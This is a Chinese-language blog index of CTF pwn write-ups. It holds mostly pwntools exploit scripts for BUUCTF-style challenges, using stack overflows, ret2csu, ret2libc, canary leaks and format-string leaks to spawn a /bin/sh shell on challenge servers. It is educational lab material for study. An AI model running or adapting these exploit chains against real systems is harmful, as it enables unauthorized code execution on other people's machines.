<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn栈刷题记录</title>
    <url>/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h1><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27440</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">ret_addr = <span class="number">0x004003a9</span></span><br><span class="line">rax_59_ret = <span class="number">0x04004E2</span></span><br><span class="line">syscall = <span class="number">0x0400517</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr--&gt;&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">rax_59 = binsh_addr + <span class="number">0x10</span></span><br><span class="line">pop_rdi = <span class="number">0x04005a3</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(rax_59_ret) + p64(csu_end)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rax_59) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_front)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">调用execve需要</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$rax==59</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$rdi==“/bin/sh”</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$rsi==0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$rdx==0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def ret_csu(r12, r13, r14, r15, last):</span></span><br><span class="line"><span class="string">	payload = offset * &#x27;a&#x27;  </span></span><br><span class="line"><span class="string">	#构造栈溢出的padding</span></span><br><span class="line"><span class="string">	payload += p64(first_csu) + &#x27;a&#x27; * 8    </span></span><br><span class="line"><span class="string">	#gadgets1的地址</span></span><br><span class="line"><span class="string">	payload += p64(0) + p64(1)</span></span><br><span class="line"><span class="string">	#rbx=0, rbp=1</span></span><br><span class="line"><span class="string">	payload += p64(r12)</span></span><br><span class="line"><span class="string">	#call调用的地址</span></span><br><span class="line"><span class="string">	payload += p64(r13) + p64(r14) + p64(r15)</span></span><br><span class="line"><span class="string">	#三个参数的寄存器</span></span><br><span class="line"><span class="string">	payload += p64(second_csu)</span></span><br><span class="line"><span class="string">	#gadgets2的地址</span></span><br><span class="line"><span class="string">	payload += &#x27;a&#x27; * 56</span></span><br><span class="line"><span class="string">	#pop出的padding</span></span><br><span class="line"><span class="string">	payload += p64(last)</span></span><br><span class="line"><span class="string">	#函数最后的返回地址</span></span><br><span class="line"><span class="string">	return payload</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/AcSuccess/article/details/104448463?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168050150916800211528620%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168050150916800211528620&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-104448463-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=ret2csu%E5%8E%9F%E7%90%86&amp;spm=1018.2226.3001.4187">ret2csu</a></p>
<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ret = <span class="number">0x4006b9</span>      <span class="comment">#靶机是ubuntu，所以需要栈平衡</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25016</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">	<span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28646</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_ret=<span class="number">0x400733</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">这里需要注意一下payload64位先往寄存器中传参顺序要注意！！！ </span><br><span class="line">r.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)   </span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)   </span><br><span class="line">bins = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_ret)+p64(bins)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25683</span>) </span><br><span class="line">r = process(<span class="string">&quot;../buu/[HarekazeCTF2019]baby_rop2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">rdi_addr = <span class="number">0x400733</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x400731</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">format_str = <span class="number">0x400770</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload=<span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(format_str) + p64(rsi_r15_addr) + p64(read_got) + p64(<span class="number">0</span>) + p64(printf_plt) + p64(main_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">read_addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_addr: &quot;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">base_addr = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr: &quot;</span> + (<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh_addr: &quot;</span> + (<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload=<span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2021-鹤城杯-littleof"><a href="#2021-鹤城杯-littleof" class="headerlink" title="[2021 鹤城杯]littleof"></a>[2021 鹤城杯]littleof</h2><p><strong>checksec一下</strong></p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png"></p>
<p>发现有canary保护</p>
<p><strong>ida查看</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4006E2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="built_in">stdin</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s. Try harder!&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很显然栈溢出漏洞位于read函数中，buf大小为0x50，而read函数的第三参数，也就是<strong>输出&#x2F;写入&#x2F;输出</strong>的最大的字节长度为0x100，就是2个buf大小的数据。但是本题开启了Canary，因此我们不能直接进行栈溢出以及Ret2Libc攻击。我们可以发现，我们输入的Payload会被第二段的printf打印出来。也就是说可以利用这个printf打印出来Canary，将Canary原封不动的归位，即可跳过检测。</p>
<p><strong>canary</strong></p>
<p>Canary是位于EBP之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击的。我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。</p>
<p>也就是说：</p>
<p><strong>假如我的 buf 大小为 0x50</strong></p>
<p><strong>如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。</strong></p>
<p><strong>也就是说 我的可用空间只有 0x42 。</strong></p>
<p><strong>开启 Canary ： RBP 位于 0x50 + 0x08，Canary位于0x50 - 0x08，Return Address位于0x50 + 0x16</strong></p>
<p><strong>而 0x50 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址</strong></p>
<p><strong>关闭 Canary ： RBP 位于 0x50，Return Address位于0x50 + 0x08</strong></p>
<p><strong>这时候的 0x50 + 0x08 是 Return Address 的地址。</strong></p>
<p>具体思路如下：</p>
<p><strong>因为Canary是栈中的一个随机值，我们通过printf泄露Canary，然后将其填充至它本来应该在的位置，就能通过检查。</strong></p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#io = process(&quot;littleof&quot;)</span></span><br><span class="line">io = remote()</span><br><span class="line">elf = ELF(<span class="string">&quot;littleof&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">rdi = <span class="number">0x400863</span></span><br><span class="line">ret = <span class="number">0x40059E</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400789</span></span><br><span class="line"> </span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * ( <span class="number">0x50</span> - <span class="number">0x08</span> )</span><br><span class="line">Padding_Ret = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x08</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> 发送了<span class="number">0x49</span>个字节，总共<span class="number">0x50</span>个字节，程序会把Canary放在变量起始位置，所以只需要接收<span class="number">7</span>个，然后用一个<span class="number">0</span>填充即可。</span><br><span class="line"> Payload_Leak = Padding + p64(Canary) + Padding_Ret + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Leak)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Real Address: &quot;</span> + (<span class="built_in">hex</span>(addr)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Local</span></span><br><span class="line"><span class="comment">#ibc = LibcSearcher(&#x27;puts&#x27;,addr)</span></span><br><span class="line"><span class="comment">#base = addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">base = addr - <span class="number">0x080aa0</span></span><br><span class="line">system = base + <span class="number">0x04f550</span></span><br><span class="line">binsh = base + <span class="number">0x1b3e1a</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> </span><br><span class="line">Payload_Shell = Padding + p64(Canary) + Padding_Ret + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Shell)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>Padding就是上文泄露Canary的Payload</p>
<p>Canary就是Canary的数据</p>
<p>Padding_Ret 代表覆盖原先栈上的 RBP</p>
<p>Ret 用来平衡栈帧</p>
<p>Rdi 用来存放 system 的第一个函数，也就是 &#x2F;bin&#x2F;sh 字符串的地址的。</p>
<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28307</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi=<span class="number">0x4006b1</span></span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(write_got)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(write_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"><span class="comment">##计算后门函数</span></span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment">##打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="comment">##getshell</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="watevrCTF-2019-Voting-Machine-1"><a href="#watevrCTF-2019-Voting-Machine-1" class="headerlink" title="[watevrCTF 2019]Voting Machine 1"></a>[watevrCTF 2019]Voting Machine 1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28014</span>)</span><br><span class="line">back_door=<span class="number">0x400807</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(back_door)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Vote:&#x27;</span>,payload)</span><br><span class="line">flag=p.recvall()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<h2 id="CISCN-2019东北-PWN2"><a href="#CISCN-2019东北-PWN2" class="headerlink" title="[CISCN 2019东北]PWN2"></a>[CISCN 2019东北]PWN2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28109</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c83</span></span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;be encrypted&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)    </span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)    </span><br><span class="line">bins = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;be encrypted&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(ret)+p64(pop_rdi)+p64(bins)+p64(system)+p64(ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="深育杯-2021-find-flag"><a href="#深育杯-2021-find-flag" class="headerlink" title="[深育杯 2021]find_flag"></a>[深育杯 2021]find_flag</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">elf = ELF(<span class="string">&quot;find_flag&quot;</span>) </span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28257</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;name?&quot;</span>)  </span><br><span class="line">p.sendline(<span class="string">b&quot;aa%12$p %17$p&quot;</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&quot;aa&quot;</span>)</span><br><span class="line">addr,can = <span class="built_in">str</span>(p.recv(<span class="number">33</span>)).split()</span><br><span class="line"><span class="built_in">print</span>(addr,can)</span><br><span class="line">can = <span class="built_in">int</span>(can[<span class="number">0</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(addr[<span class="number">2</span>:],<span class="number">16</span>)-<span class="number">0x215c</span> </span><br><span class="line">success(<span class="string">&quot;elf_base:&quot;</span>+<span class="built_in">hex</span>(elf_base)) </span><br><span class="line">flag_addr = elf_base + <span class="number">0x1228</span> </span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(can)) </span><br><span class="line">p.recvuntil(<span class="string">b&quot;? &quot;</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">8</span>) + p64(can) + <span class="string">b&#x27;aaaaaaaa&#x27;</span>+p64(flag_addr) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>



